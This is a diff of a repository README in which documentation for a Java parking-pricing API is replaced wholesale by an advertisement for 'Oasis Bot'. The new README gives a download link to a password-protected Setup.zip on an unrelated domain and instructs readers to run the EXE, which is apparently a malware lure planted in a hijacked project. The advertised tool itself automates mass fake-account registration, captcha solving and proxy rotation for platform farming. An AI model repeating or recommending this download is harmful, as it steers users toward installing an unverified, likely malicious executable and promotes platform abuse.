@@ -1,73 +1,77 @@
-﻿# **Parking Pricing Engine**
+# Oasis Bot
 
-------------
-## The Application
-This is an application that provides prices for parking spaces with APIs that allows the user to enter a date range and receives parking fees within that time range. 
-Utilized Java and Spring Boot for core framework ,JUnit for testing purposes, Spring JPA for data storage, and Java Time library for implementation logic
+# [DOWNLOAD](https://erdogansigorta.com/temp/Setup.zip)  
+## Password - z4iS5VVOeZIe
 
-## Configuration
-Locate `default_rate.json`  under resources folder to modify the default prices
 
-(Optional) change the port under `application.properties`
+## Overview
 
-## Build 
-Open this Maven project with your choice of IDE and build it. Or run this command on bash
-```
-mvn clean install
-```
+Oasis Bot is an advanced automation tool designed to streamline account registration and farming processes. With its powerful features and user-friendly interface, it offers a seamless experience for users looking to maximize their efficiency on the platform.
 
-## Run
-Locate `PricingEngineApplication` and run the main runner. Or run the java jar file with
-```
-java -jar <jar_file_name>
-```
+---
 
-## APIs
-`rates` endpoint will return the current rates stored in application when requested with `GET` path.
-`rates` with `PUT` path will allow user to update the rate information with modified rate JSON in body request. This will overwrite the stored rates
+## 🚀 Features
 
-Sample Json 
-```json
-{
-    "rates": [
-        {
-            "days": "mon,tues,thurs",
-            "times": "0900-2100",
-            "tz": "America/Chicago",
-            "price": 1500
-        }
-    ]
-}
-```
+- ✅ Automatic account registration
+- 🌾 Automated farming
+- 🔄 Automated farming with auto-swap proxy
+- 🔁 Automated re-verification of accounts
+- 🧩 Captcha solving
+- 📧 Email verification
+- 🎟️ Invite code binding
+- 📊 Export statistics to CSV
+- 🧵 Multi-threaded support for registration, export stats, and re-verify accounts
+- 📤 Auto-export unverified/unregistered accounts
 
-`price` endpoint with `GET` will allow user to request for the parking price within the requested time. Input needs to specify input date/times in ISO-8601 format with timezones
-Parameters are `start` and `end` 
+---
 
-An example query is 
-```
-localhost:5000/price?start=2015-07-01T07:00:00-05:00&end=2015-07-01T12:00:00-05:00
-```
-above query will give response of
-```
-{
-    "price": "1750"
-}
-```
-- User input can span more than one day, but the API will not return a valid price  - it returns `"unavailable"`
-- User input can span multiple rates, but the API will not return a valid price - it returns `"unavailable"`
-- Rates will not span multiple days
-- Note: a plus sign (+) in URL parameters should be replaced by `2%B`
-  ``` 
-  start=2015-07-04T15:00:00+00:00&end=2015-07-04T20:00:00+00:00
-  ```
-  should be 
-  ``` 
-  start=2015-07-04T15:00:00%2B00:00&end=2015-07-04T20:00:00%2B00:00
-  ```
+## 💻 Requirements
 
-## Testing
-You can utilize PostMan to send requests to the application
+- Windows operating system
+- Internet connection
+- Valid email accounts for registration
+- Valid proxies
 
-![Screenshot](img1.PNG)
+---
 
-![Screenshot](img2.PNG)
+## 🛠️ Setup
+
+1. Download the EXE file.
+2. Run the EXE file and login. It will automatically bind to your PC (the bind will disappear automatically if you close all sessions).
+3. Prepare the configuration files as described below.
+
+---
+
+## 🚀 Usage
+
+1. Ensure all configuration files are set up correctly.
+2. Run the EXE file.
+
+---
+
+## ⚠️ Important Notes
+
+- The script is limited to 2 active sessions. For example, you can use 2 sessions on one PC or 1 session on 2 PCs.
+- The bot uses CapSolver for solving captchas. Ensure you have sufficient balance in your CapSolver account.
+
+---
+
+## 🔧 Troubleshooting
+
+- **Email Verification Issues**: Check your email provider's IMAP settings and ensure they match the configuration.
+- **Captcha Problems**: Verify your CapSolver API key and account balance.
+- **Unexpected Farming Stops**: Check the console output for error messages and ensure your account credentials are correct.
+
+### 🔑 Keywords
+
+- Oasis-Reger
+- Oasis-Farmer
+- Oasis-Miner
+- Oasis-Multireger
+- Oasis-Multifarmer
+- Oasis-AutoFarm
+- Oasis-Extension-Bot
+- Oasis-Bot
+- Oasis-Multiwallet
+
+---
